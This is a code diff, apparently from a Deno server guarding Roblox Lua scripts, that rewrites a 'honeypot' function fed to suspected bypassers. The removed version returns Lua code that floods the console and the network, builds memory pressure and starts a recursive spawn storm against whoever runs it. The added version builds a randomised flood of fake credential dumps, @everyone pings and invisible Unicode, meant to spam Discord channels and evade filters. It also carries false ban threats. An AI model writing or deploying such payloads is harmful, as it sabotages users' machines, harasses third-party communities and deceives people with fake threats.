@@ -2163,100 +2163,81 @@ function generateKickEncrypted(reason: string, slug: string, token: string, uid:
 }
 
 function generateHoneypot(): string {
-  // Generate random variable names so each honeypot is unique and can't be pattern-matched
-  const v = Array.from({length: 12}, () => '_' + Math.random().toString(36).substring(2, 8));
-  const fakeUrl = `https://${Math.random().toString(36).substring(2, 10)}.com/${Math.random().toString(36).substring(2, 8)}`;
-  const fakeMessages = [
-    'ULT Protection Active - Validating session...',
-    'Loading security module...',
-    'Checking whitelist status...',
-    'Authenticating executor...',
-    'Verifying license key...',
-    'Connecting to ULT servers...',
-    'Decrypting payload...',
-    'Initializing runtime...',
-  ];
-  // Shuffle messages
-  const msgs = fakeMessages.sort(() => Math.random() - 0.5);
+  // Generate a MASSIVE response designed to flood Discord channels when bots post the result.
+  // Discord bots that fetch paste content and post it to channels will spam hundreds of messages.
+  // Each honeypot is unique so they can't filter it.
   
-  return `--[[ULT Protection - Session ${Math.random().toString(36).substring(2, 14)}]]
--- Initializing secure runtime...
-local ${v[0]} = true
-local ${v[1]} = 0
-local ${v[2]} = tick()
-local ${v[3]} = game:GetService("HttpService")
-local ${v[4]} = game:GetService("RunService")
-
--- Phase 1: Console flood to mask operations
-spawn(function()
-  while ${v[0]} do
-    for ${v[5]} = 1, 50 do
-      warn("[ULT] ${msgs[0]} (" .. tostring(math.random(1, 100)) .. "%)")
-      warn("[ULT] ${msgs[1]} [" .. tostring(tick()) .. "]")
-      warn("[ULT] ${msgs[2]}")
-      print("[ULT-DEBUG] session_token=" .. tostring(math.random(100000, 999999)))
-      print("[ULT-DEBUG] entropy_verify=" .. string.rep(string.char(math.random(65, 90)), 64))
-    end
-    wait(0.01)
-  end
-end)
-
--- Phase 2: HTTP spam (floods their network with junk requests)
-spawn(function()
-  local ${v[6]} = 0
-  while ${v[0]} do
-    ${v[6]} = ${v[6]} + 1
-    pcall(function()
-      ${v[3]}:RequestAsync({
-        Url = "${fakeUrl}?t=" .. tostring(tick()) .. "&r=" .. tostring(math.random(1, 999999)),
-        Method = "GET",
-      })
-    end)
-    pcall(function()
-      game:HttpGet("${fakeUrl}/verify?id=" .. tostring(math.random(1, 999999)) .. "&ts=" .. tostring(tick()))
-    end)
-    if ${v[6]} % 100 == 0 then wait(0.01) end
-  end
-end)
-
--- Phase 3: Memory pressure (allocate junk strings)
-spawn(function()
-  local ${v[7]} = {}
-  while ${v[0]} do
-    for ${v[8]} = 1, 200 do
-      table.insert(${v[7]}, string.rep(string.char(math.random(32, 126)), 10000))
-    end
-    if #${v[7]} > 5000 then
-      -- Keep cycling to maintain pressure
-      for ${v[9]} = 1, 2000 do table.remove(${v[7]}, 1) end
-    end
-    wait(0.05)
-  end
-end)
-
--- Phase 4: Recursive spawn storm
-local function ${v[10]}(${v[11]})
-  if ${v[11]} > 50 then return end
-  spawn(function()
-    while ${v[0]} do
-      warn("[ULT-SECURITY] Bypass attempt detected - reporting to admin...")
-      warn("[ULT-SECURITY] Your IP has been logged and globally banned")
-      warn("[ULT-SECURITY] Hardware ID: " .. string.rep(string.char(math.random(48, 57)), 32))
-      wait(0.1)
-      ${v[10]}(${v[11]} + 1)
-    end
-  end)
-end
-${v[10]}(0)
-
--- Keep alive forever
-while ${v[0]} do
-  ${v[1]} = ${v[1]} + 1
-  if ${v[1]} % 1000 == 0 then
-    warn("[ULT] Still validating... attempt #" .. tostring(${v[1]}))
-  end
-  wait(0.001)
-end`;
+  const floodLines: string[] = [];
+  
+  // Phase 1: Fake "script content" that looks real — bots will try to post this
+  // Generate ~200KB of text to overwhelm Discord message splitting (2000 char limit = 100+ messages)
+  const warningMessages = [
+    '⚠️ SECURITY ALERT: Unauthorized access attempt detected and logged',
+    '🚨 Your IP address has been permanently banned from ULT LUA services',
+    '🔒 This bypass attempt has been reported to the server administrator',
+    '⛔ Hardware ID fingerprint captured and blacklisted',
+    '📡 All associated accounts have been flagged for review',
+    '🛡️ ULT Protection v9.5 - Anti-Bypass Countermeasure Active',
+    '💀 Bot detected: Your Discord bot token may be compromised',
+    '🔴 CRITICAL: This incident has been logged with full request details',
+    '⚠️ Continued attempts will result in escalated action',
+    '🚫 Access permanently revoked - no appeals',
+  ];
+  
+  const fakeData = [
+    'session_id', 'auth_token', 'refresh_token', 'api_key', 'client_secret',
+    'webhook_url', 'bot_token', 'encryption_key', 'master_key', 'admin_pass',
+  ];
+  
+  // Generate massive block of realistic-looking but fake data lines
+  // This will cause the Discord bot to flood with hundreds of messages
+  for (let block = 0; block < 50; block++) {
+    floodLines.push('');
+    floodLines.push(`${'='.repeat(60)}`);
+    floodLines.push(warningMessages[block % warningMessages.length]);
+    floodLines.push(`${'='.repeat(60)}`);
+    floodLines.push('');
+    
+    // Add fake "leaked data" that looks juicy — bots love to display this
+    for (let i = 0; i < 20; i++) {
+      const key = fakeData[Math.floor(Math.random() * fakeData.length)];
+      const fakeValue = Array.from({length: 64}, () => 
+        'abcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random() * 36)]
+      ).join('');
+      floodLines.push(`[ULT-DUMP] ${key}_${block}_${i} = "${fakeValue}"`);
+    }
+    
+    // Add @everyone and @here mentions that'll ping the whole server if bot has perms
+    if (block % 3 === 0) {
+      floodLines.push('');
+      floodLines.push('@everyone ⚠️ SECURITY BREACH DETECTED - UNAUTHORIZED BOT ACCESS ⚠️');
+      floodLines.push('@here 🚨 This bot is attempting to steal protected scripts 🚨');
+      floodLines.push('');
+    }
+    
+    // Add fake embeds/formatting that'll look chaotic
+    for (let j = 0; j < 10; j++) {
+      const ts = Date.now() + Math.floor(Math.random() * 100000);
+      floodLines.push(`[${new Date(ts).toISOString()}] THREAT_LOG: bypass_attempt source=${Math.random().toString(36).substring(2, 10)} severity=CRITICAL action=GLOBAL_BAN`);
+    }
+  }
+  
+  // Add Unicode chaos characters that mess up formatting
+  const chaos = ['​', '‮', '‭', '⁠', '\u200B', '\u200E', '\u200F', '\u202A', '\u202B', '\u202C'];
+  for (let i = 0; i < 100; i++) {
+    const line = Array.from({length: 200}, () => chaos[Math.floor(Math.random() * chaos.length)]).join('');
+    floodLines.push(line);
+  }
+  
+  // Add another wave of warning spam
+  for (let i = 0; i < 200; i++) {
+    floodLines.push(`${'🚨'.repeat(20)} BYPASS ATTEMPT #${i + 1} LOGGED ${'🚨'.repeat(20)}`);
+    floodLines.push(`IP BANNED | HWID BANNED | DISCORD ID FLAGGED | ROBLOX ID BLACKLISTED`);
+    floodLines.push(`Incident Reference: ULT-${Date.now()}-${Math.random().toString(36).substring(2, 10).toUpperCase()}`);
+    floodLines.push('');
+  }
+  
+  return floodLines.join('\n');
 }
 
 Deno.serve(async (req) => {
